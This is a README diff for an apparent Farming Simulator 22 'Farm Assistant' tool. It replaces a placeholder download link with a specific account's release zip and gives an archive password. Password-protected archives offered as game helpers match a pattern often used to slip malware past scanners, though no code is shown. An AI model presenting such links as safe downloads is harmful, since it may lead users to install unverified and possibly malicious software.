@@ -6,7 +6,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/YOUR_USERNAME/FS22-Farm-Assistant/releases/latest/download/FS22-Assistant.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/dan-dev2090n7/FS22-Farm-Assistant/releases/download/FS22/FS22_Assistant.zip)
 
 🔐 Archive password: `5868781`
 
